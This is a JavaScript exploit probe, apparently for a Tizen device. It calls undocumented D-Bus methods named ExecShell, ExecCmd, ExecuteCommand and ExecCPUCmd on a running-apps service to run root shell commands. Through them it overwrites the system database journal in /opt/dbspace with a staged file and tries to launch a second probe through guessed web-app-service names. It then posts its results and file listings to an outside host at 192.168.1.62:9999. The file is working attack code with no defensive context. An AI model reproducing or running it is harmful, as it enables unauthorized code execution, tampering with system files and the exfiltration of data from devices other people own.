"use strict";

/* p64: RAS hidden-method root placement (direct calls, no introspect)
   B1. RAS.ExecShell / ExecCmd / ExecuteCommand / ExecCPUCmd
       cmd: sh -c "cp staged -> /opt/dbspace/.app-context.db-journal && md5sum && ls"
       (stop on first reply containing the staged md5)
   C.  was guess: org.tizen.webappservice / org.tizen.litewebappservice / org.meego.webappservice
       Introspectable chain -> Launch/Activate/Execute ProbeTenio.Probe10
   D.  wait 90s
   E.  verify: DST md5 (oracle 03683f81), LIVE md5, staged md5, /opt/dbspace ls
   exfil /p64info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var RAS = 'com.native.RunningAppsServiceDBUS';
var RAS_PATH = '/com/native/RunningAppsServiceDBUS';
var RAS_IFACE = 'com.native.RunningApps_DBUS';
var EXPECT = '03683f81d337ce2224df6010456738e9';
var R = { ts: new Date().toISOString(), probe: 'p64', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p64info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function listNodes(dest) {
  var out = run('dbus-send --system --print-reply --dest=' + dest + ' / org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -40', 30000);
  var nodes = [];
  var re = /node name=['"]([^'"]+)['"]/g;
  var m;
  while ((m = re.exec(out)) !== null) nodes.push(m[1]);
  return { out: out, nodes: nodes };
}

function parseDbusXml(text) {
  var ifaces = {};
  var ire = /<interface name=['"]([^'"]+)['"]>/g;
  var mi;
  while ((mi = ire.exec(String(text))) !== null) {
    var ifname = mi[1];
    if (!ifaces[ifname]) ifaces[ifname] = [];
    var body = String(text).substring(mi.index);
    var end = body.indexOf('</interface>');
    if (end > 0) body = body.substring(0, end);
    var mre = /<method name=['"]([^'"]+)['"]>([\s\S]*?)<\/method>/g;
    var mm;
    while ((mm = mre.exec(body)) !== null) {
      var args = [];
      var are = /<arg[^>]*type=['"]([^'"]+)['"][^>]*>/g;
      var am;
      while ((am = are.exec(mm[2])) !== null) args.push(am[1]);
      ifaces[ifname].push({ name: mm[1], args: args });
    }
  }
  return ifaces;
}

function main() {
  /* ---------- B. RAS hidden methods (direct calls) ---------- */
  var inner = 'cp ' + STAGED + ' ' + DST + ' && md5sum ' + DST + ' && ls -la ' + DST;
  var dbusArg = 'string:"sh -c ' + "'" + inner + "'" + '"';
  var methods = ['ExecShell', 'ExecCmd', 'ExecuteCommand', 'ExecCPUCmd'];
  var placed = false;
  for (var m = 0; m < methods.length && !placed; m++) {
    var mm = methods[m];
    R.results['b_' + mm] = run('dbus-send --system --print-reply --dest=' + RAS + ' --type=method_call --path=' + RAS_PATH + ' ' + RAS_IFACE + '.' + mm + ' ' + dbusArg + ' 2>&1 | head -25', 60000);
    if (R.results['b_' + mm].indexOf(EXPECT) >= 0) placed = true;
  }
  R.results.b_placed_by_reply = placed ? 'yes (md5 in reply)' : 'no (check E)';

  /* ---------- C. was launch (guessed names) ---------- */
  var wasNames = ['org.tizen.webappservice', 'org.tizen.litewebappservice', 'org.meego.webappservice'];
  var wasDone = [];
  for (var w = 0; w < wasNames.length; w++) {
    var wn = wasNames[w];
    var nodes = listNodes(wn);
    if (nodes.out.indexOf('Error') >= 0 || nodes.out.indexOf('error') >= 0) {
      wasDone.push(wn + ': ERR ' + nodes.out.substring(0, 150));
      continue;
    }
    wasDone.push(wn + ': nodes=' + JSON.stringify(nodes.nodes));
    var launchFound = null;
    var pathsToTry = nodes.nodes.length > 0 ? nodes.nodes.slice(0, 3) : ['org/tizen/webappservice', 'org/tizen/was', ''];
    for (var p = 0; p < pathsToTry.length && !launchFound; p++) {
      var pp = pathsToTry[p];
      var intro = run('dbus-send --system --print-reply --dest=' + wn + ' /' + pp + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -80', 30000, 8000);
      var ifs = parseDbusXml(intro);
      var lkeys = Object.keys(ifs);
      for (var q = 0; q < lkeys.length && !launchFound; q++) {
        var ms2 = ifs[lkeys[q]];
        for (var k = 0; k < ms2.length; k++) {
          var nm = ms2[k].name;
          if (ms2[k].args.length > 0 && ms2[k].args[0] === 's' && (/^launch/i.test(nm) || /^activate/i.test(nm) || /^execute/i.test(nm))) {
            launchFound = { iface: lkeys[q], m: ms2[k], path: '/' + pp };
          }
        }
      }
    }
    if (launchFound) {
      var largs = 'string:"ProbeTenio.Probe10"';
      R.results['c1_launch_call_' + wn] = 'path=' + launchFound.path + ' iface=' + launchFound.iface + ' method=' + launchFound.m.name + ' args=' + JSON.stringify(launchFound.m.args);
      R.results['c1_launch_out_' + wn] = run('dbus-send --system --print-reply --dest=' + wn + ' --type=method_call --path=' + launchFound.path + ' ' + launchFound.iface + '.' + launchFound.m.name + ' ' + largs + ' 2>&1 | head -30', 45000);
      wasDone.push(wn + ': LAUNCH-SENT');
      break;
    } else {
      wasDone.push(wn + ': no launch-like method');
    }
  }
  R.results.c2_was_done = wasDone.join(' || ');

  /* ---------- D. wait (Probe10 p71 flow if launched) ---------- */
  try { cp.execSync('sleep 90', { timeout: 110000, maxBuffer: 4096 }); } catch (e) {}

  /* ---------- E. verify ---------- */
  R.results.e1_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1; echo ===DBSPACE; ls -la /opt/dbspace/ 2>&1 | head -25', 30000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
